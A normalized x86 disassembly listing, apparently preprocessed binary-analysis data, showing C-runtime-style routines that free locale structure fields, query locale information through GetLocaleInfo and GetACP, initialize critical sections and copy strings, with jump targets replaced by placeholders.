call sub_1001a3eb
push [ esi + 0xc0 ]
call sub_1001a3eb
push [ esi + 0xc4 ]
call sub_1001a3eb
push [ esi + 0xc8 ]
call sub_1001a3eb
push [ esi + 0xcc ]
call sub_1001a3eb
add esp 0x40
push [ esi + 0xd0 ]
call sub_1001a3eb
push [ esi + 0xb8 ]
call sub_1001a3eb
push [ esi + 0xd8 ]
call sub_1001a3eb
push [ esi + 0xdc ]
call sub_1001a3eb
push [ esi + 0xe0 ]
call sub_1001a3eb
push [ esi + 0xe4 ]
call sub_1001a3eb
push [ esi + 0xe8 ]
call sub_1001a3eb
push [ esi + 0xec ]
call sub_1001a3eb
push [ esi + 0xd4 ]
call sub_1001a3eb
push [ esi + 0xf0 ]
call sub_1001a3eb
push [ esi + 0xf4 ]
call sub_1001a3eb
push [ esi + 0xf8 ]
call sub_1001a3eb
push [ esi + 0xfc ]
call sub_1001a3eb
push [ esi + 0x100 ]
call sub_1001a3eb
push [ esi + 0x104 ]
call sub_1001a3eb
push [ esi + 0x108 ]
call sub_1001a3eb
add esp 0x40
push [ esi + 0x10c ]
call sub_1001a3eb
push [ esi + 0x110 ]
call sub_1001a3eb
push [ esi + 0x114 ]
call sub_1001a3eb
push [ esi + 0x118 ]
call sub_1001a3eb
push [ esi + 0x11c ]
call sub_1001a3eb
push [ esi + 0x120 ]
call sub_1001a3eb
push [ esi + 0x124 ]
call sub_1001a3eb
push [ esi + 0x128 ]
call sub_1001a3eb
push [ esi + 0x12c ]
call sub_1001a3eb
push [ esi + 0x130 ]
call sub_1001a3eb
push [ esi + 0x134 ]
call sub_1001a3eb
push [ esi + 0x138 ]
call sub_1001a3eb
push [ esi + 0x13c ]
call sub_1001a3eb
push [ esi + 0x140 ]
call sub_1001a3eb
push [ esi + 0x144 ]
call sub_1001a3eb
push [ esi + 0x148 ]
call sub_1001a3eb
add esp 0x40
push [ esi + 0x14c ]
call sub_1001a3eb
push [ esi + 0x150 ]
call sub_1001a3eb
push [ esi + 0x154 ]
call sub_1001a3eb
push [ esi + 0x158 ]
call sub_1001a3eb
push [ esi + 0x15c ]
call sub_1001a3eb
push [ esi + 0x160 ]
call sub_1001a3eb
add esp 0x18
sub_1002370e
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x20 ] 0x0
push edi
mov ebx rw-data
je r-xdata
mov edi ebx
push 0x164
push 0x1
call sub_1001bd01
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
mov [ esi + 0xd4 ] edi
xor eax eax
add eax 0xb4
push eax
call [ InterlockedDecrement@IAT ]
mov eax esi
mov ecx edi
call sub_10022b98
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ edi + 0xb4 ] 0x1
jmp r-xdata
push edi
call sub_10023397
push edi
call sub_1001a3eb
pop ecx
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0xd4 ]
cmp eax ebx
je r-xdata
sub_1002378b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001a3eb
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001a3eb
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001a3eb
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_1001a3eb
pop ecx
push esi
call sub_1001a3eb
pop ecx
sub_100237f4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x50
push 0x1
call sub_1001bd01
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x18 ] edi
jne r-xdata
mov esi [ esi + 0xbc ]
push 0x14
pop ecx
mov edi ebx
push 0x4
[ edi ] [ esi ]
call sub_1001bcbc
xor edi edi
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rw-data
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov [ eax ] edi
cmp [ esi + 0x1c ] edi
je r-xdata
push ebx
call sub_1001a3eb
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb4 ]
mov edi [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ ebx ] eax
mov eax [ rw-data ]
mov [ ebx + 0x4 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x8 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x30 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] edi
mov [ ebx + 0x34 ] eax
push 0x4
call sub_1001bcbc
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
test eax eax
je r-xdata
push eax
call edi
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x3e ]
push ebx
push 0xe
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001df79
mov edi eax
lea eax [ ebx + 0x4 ]
push eax
push 0xf
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ ebx + 0x8 ]
push eax
push 0x10
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ ebx + 0x30 ]
push eax
push 0xe
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1001df79
add esp 0x50
or edi eax
lea eax [ ebx + 0x34 ]
push eax
push 0xf
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1001df79
add esp 0x14
or eax edi
je r-xdata
xor esi esi
inc esi
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb4 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call edi
test eax eax
jne r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
push ebx
call sub_1002378b
pop ecx
or esi 0xffffffff
jmp r-xdata
push [ esi + 0xb0 ]
call sub_1001a3eb
push [ esi + 0xbc ]
call sub_1001a3eb
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
push ebx
call sub_1001a3eb
push [ ebp - 0x8 ]
call sub_1001a3eb
pop ecx
pop ecx
mov eax esi
jmp r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ecx ] eax
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
mov cl [ esi + 0x1 ]
mov [ esi ] cl
inc esi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_100239e4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001a3eb
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001a3eb
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001a3eb
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001a3eb
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001a3eb
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001a3eb
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001a3eb
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001a3eb
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001a3eb
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001a3eb
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001a3eb
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_1001a3eb
pop ecx
push esi
call sub_1001a3eb
pop ecx
sub_10023ae2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x18 ] edi
jne r-xdata
push 0x50
push 0x1
call sub_1001bd01
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x4
call sub_1001bcbc
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rw-data
jmp r-xdata
mov [ eax ] edi
cmp [ esi + 0x18 ] edi
je r-xdata
push ebx
call sub_1001a3eb
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb8 ]
cmp eax edi
je r-xdata
push 0x14
pop ecx
mov esi rw-data
mov edi ebx
[ edi ] [ esi ]
push 0x4
call sub_1001bcbc
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax edi
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x38 ]
lea eax [ ebx + 0xc ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001df79
mov edi eax
lea eax [ ebx + 0x10 ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ ebx + 0x14 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ ebx + 0x18 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001df79
add esp 0x50
or edi eax
lea eax [ ebx + 0x1c ]
push eax
push 0x18
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ ebx + 0x20 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ ebx + 0x24 ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001df79
or edi eax
lea eax [ ebx + 0x28 ]
push eax
push 0x1a
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1001df79
add esp 0x50
or edi eax
lea eax [ ebx + 0x29 ]
push eax
push 0x19
push esi
push 0x0
lea eax [ ebp - 0x10 ]
push eax
call sub_1001df79
or edi eax
lea eax [ ebx + 0x2a ]
push eax
push 0x54
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1001df79
or edi eax
lea eax [ ebx + 0x2b ]
push eax
push 0x55
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1001df79
or edi eax
lea eax [ ebx + 0x2c ]
push eax
push 0x56
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1001df79
add esp 0x50
or edi eax
lea eax [ ebx + 0x2d ]
push eax
push 0x57
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1001df79
or edi eax
lea eax [ ebx + 0x2e ]
push eax
push 0x52
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1001df79
or edi eax
lea eax [ ebx + 0x2f ]
push eax
push 0x53
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1001df79
or edi eax
lea eax [ ebx + 0x38 ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1001df79
add esp 0x50
or edi eax
lea eax [ ebx + 0x3c ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ ebx + 0x40 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ ebx + 0x44 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1001df79
or edi eax
lea eax [ ebx + 0x48 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1001df79
add esp 0x50
or edi eax
lea eax [ ebx + 0x4c ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1001df79
add esp 0x14
or eax edi
je r-xdata
push ebx
call sub_1001a3eb
push [ ebp - 0x8 ]
call sub_1001a3eb
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb8 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
push ebx
call sub_100239e4
push ebx
call sub_1001a3eb
push [ ebp - 0x8 ]
call sub_1001a3eb
push [ ebp - 0x4 ]
call sub_1001a3eb
add esp 0x10
jmp r-xdata
pop ecx
jmp r-xdata
push [ esi + 0xbc ]
call sub_1001a3eb
push [ esi + 0xb0 ]
call sub_1001a3eb
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xbc ]
mov ecx [ ecx ]
mov [ ebx ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ ebx + 0x4 ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x30 ]
mov [ ebx + 0x30 ] ecx
mov eax [ eax + 0xbc ]
mov eax [ eax + 0x34 ]
mov ecx [ ebp - 0x8 ]
mov [ ebx + 0x34 ] eax
xor eax eax
inc eax
xor edi edi
mov [ ecx ] eax
cmp [ ebp - 0x4 ] edi
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
mov cl [ esi + 0x1 ]
mov [ esi ] cl
inc esi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_10023e45
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_10023efd
push 0xc
push r--data
call sub_10020070
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_1001df40
push 0x1e
call sub_1001dd91
push 0xff
call sub_1001eb6a
push 0x18
call sub_1001bcbc
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_10023fbf
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_1001bddd
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_100200b5
retn
push edi
call sub_1001a3eb
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_1001a3eb
pop ecx
call sub_1001bddd
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10023fb6
mov eax [ ebp - 0x1c ]
sub_10023fbf
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_10023efd
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_1001ede7
sub_10023ff2
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
push edi
test ecx ecx
je r-xdata
call sub_1001bddd
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov edx [ ebp + 0x10 ]
test edx edx
jne r-xdata
mov esi ecx
mov [ ecx ] 0x0
jmp r-xdata
test edi edi
je r-xdata
inc esi
dec edi
jne r-xdata
sub esi edx
cmp [ esi ] 0x0
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] 0x0
call sub_1001bddd
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ edx ]
mov [ esi + edx ] al
inc edx
test al al
je r-xdata
call sub_1001ea75
mov eax esi
jmp r-xdata
sub_1002405f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
jne r-xdata
call sub_1001bddd
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ eax ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov ecx eax
jne r-xdata
mov [ eax ] bl
jmp r-xdata
mov esi edx
sub esi eax
mov esi eax
sub esi edx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ ecx ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
mov cl [ edx ]
mov [ esi + edx ] cl
inc edx
cmp cl bl
je r-xdata
jmp r-xdata
mov dl [ esi + ecx ]
mov [ ecx ] dl
inc ecx
cmp dl bl
je r-xdata
mov [ eax ] bl
call sub_1001bddd
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ eax + ecx - 0x1 ] bl
pop eax
jmp r-xdata
call sub_1001ea75
mov eax esi
jmp r-xdata
sub_10024114
mov edi edi
push ebp
mov ebp esp
xor eax eax
push ebx
xor ebx ebx
inc eax
cmp [ ebp + 0xc ] ebx
jl r-xdata
xor ecx ecx
test eax eax
sete cl
pop ebx
mov eax ecx
pop ebp
retn
push esi
push edi
pop edi
pop esi
mov eax [ ebp + 0xc ]
add eax ebx
cdq
sub eax edx
mov esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
lea edi [ eax + esi * 8 ]
push [ edi ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_10028dd4
pop ecx
pop ecx
test eax eax
jne r-xdata
jns r-xdata
mov ecx [ ebp + 0x10 ]
add edi 0x4
mov [ ecx ] edi
jmp r-xdata
lea ebx [ esi + 0x1 ]
dec esi
mov [ ebp + 0xc ] esi
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jle r-xdata
test eax eax
je r-xdata
sub_10024176
mov edi edi
push ebp
mov ebp esp
push ecx
test esi esi
je r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x20001004
push [ edi + 0x1c ]
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
leave
retn
push r--data
push esi
call sub_1001dbd0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
call [ GetACP@IAT ]
leave
retn
push r--data
push esi
call sub_1001dbd0
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_10028e1b
pop ecx
mov [ ebp - 0x4 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x2000000b
push [ edi + 0x1c ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
sub_100241fa
mov edi edi
push ebp
mov ebp esp
xor eax eax
xor eax eax
pop ebp
retn
add eax 0x2
cmp eax 0x14
jb r-xdata
mov cx [ ebp + 0x8 ]
cmp cx [ eax + r--data ]
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_1002421f
mov edi edi
push esi
xor esi esi
jmp r-xdata
mov cl [ edx ]
test cl cl
jne r-xdata
lea eax [ ecx - 0x61 ]
inc edx
cmp al 0x5
ja r-xdata
mov eax esi
pop esi
retn
lea eax [ ecx - 0x41 ]
cmp al 0x5
ja r-xdata
add cl 0xd9
jmp r-xdata
movsx eax cl
add esi esi
lea esi [ eax + esi * 8 - 0x30 ]
add cl 0xf9
sub_10024250
xor eax eax
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
retn
inc eax
jmp r-xdata
mov cl [ edx ]
inc edx
cmp cl 0x41
jl r-xdata
sub_1002426b
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_1001e316
mov edx edi
mov esi eax
call sub_1002421f
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0xb0 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0xa0 ]
call sub_10028dd4
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0xa4 ] eax
inc eax
jmp r-xdata
mov eax [ esi + 0xa4 ]
shr eax 0x2
not eax
and eax 0x1
push edi
call sub_100241fa
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1001a809
leave
retn 0x4
or [ esi + 0xa4 ] 0x4
mov [ esi + 0xb8 ] edi
mov [ esi + 0xb4 ] edi
sub_10024312
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
mov eax esi
and eax 0x3ff
push 0x20000001
or eax 0x400
push eax
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp esi [ ebp - 0x4 ]
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop esi
leave
retn
mov eax [ ebp + 0xc ]
mov esi [ eax ]
push edi
mov edx esi
call sub_10024250
push esi
mov edi eax
call sub_1001cbb0
pop ecx
cmp edi eax
pop edi
je r-xdata
sub_1002436d
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_1001e316
mov edx edi
lea esi [ eax + 0x9c ]
call sub_1002421f
mov ebx [ GetLocaleInfoA@IAT ]
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call ebx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_10028dd4
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov eax 0x300
and ecx eax
cmp ecx eax
je r-xdata
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1001a809
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10028dd4
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10028dd4
pop ecx
xor ebx ebx
pop ecx
test eax eax
jne r-xdata
test [ esi + 0x8 ] 0x2
jne r-xdata
or [ esi + 0x8 ] 0x304
mov [ esi + 0x18 ] edi
jmp r-xdata
cmp [ esi + 0x10 ] ebx
jne r-xdata
or [ esi + 0x8 ] 0x200
mov eax [ esi + 0x8 ]
cmp [ esi + 0x10 ] ebx
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ esi + 0x1c ] edi
cmp [ esi + 0xc ] ebx
je r-xdata
cmp [ esi + 0xc ] ebx
je r-xdata
or eax 0x100
mov [ esi + 0x8 ] eax
jmp r-xdata
mov edx [ esi + 0x8 ]
test dl 0x1
jne r-xdata
push eax
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10028f13
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10028dd4
pop ecx
pop ecx
test eax eax
jne r-xdata
or [ esi + 0x8 ] 0x100
push [ esi ]
call sub_1001cbb0
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
push edi
call sub_100241fa
pop ecx
test eax eax
je r-xdata
push [ esi ]
or [ esi + 0x8 ] 0x2
mov [ esi + 0x1c ] edi
call sub_1001cbb0
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
push esi
push ebx
mov [ esi + 0x18 ] edi
push esi
push 0x1
jmp r-xdata
or edx 0x1
mov [ esi + 0x8 ] edx
mov [ esi + 0x18 ] edi
jmp r-xdata
mov eax edi
call sub_10024312
pop ecx
pop ecx
test eax eax
je r-xdata
sub_1002453e
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_1001e316
mov edx edi
lea esi [ eax + 0x9c ]
call sub_1002421f
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10028dd4
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1001a809
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
cmp [ esi + 0xc ] 0x0
je r-xdata
or [ esi + 0x8 ] 0x4
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
push esi
push 0x1
jmp r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10028dd4
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax edi
call sub_10024312
pop ecx
pop ecx
test eax eax
je r-xdata
push esi
push eax
sub_100245fe
push [ esi ]
call sub_1001cbb0
push [ esi + 0x4 ]
sub eax 0x3
neg eax
sbb eax eax
inc eax
mov [ esi + 0x10 ] eax
call sub_1001cbb0
sub eax 0x3
neg eax
sbb eax eax
and [ esi + 0x18 ] 0x0
inc eax
cmp [ esi + 0x10 ] 0x0
pop ecx
